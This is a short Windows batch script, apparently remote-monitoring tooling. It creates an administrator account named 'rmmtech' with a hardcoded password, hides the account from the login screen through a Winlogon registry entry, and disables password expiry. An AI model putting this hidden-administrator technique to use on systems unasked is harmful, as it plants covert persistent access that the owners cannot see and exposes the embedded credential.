@echo off
echo Creating account. . .
net user rmmtech 9Uw8J!@tnYp7 /add
echo Adding to admins group. . .
net localgroup Administrators rmmtech /add
echo Hiding account. . .
REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v rmmtech /t REG_DWORD /d 0
echo Setting password to never expire. . .
wmic useraccount where "Name='rmmtech'" set PasswordExpires=false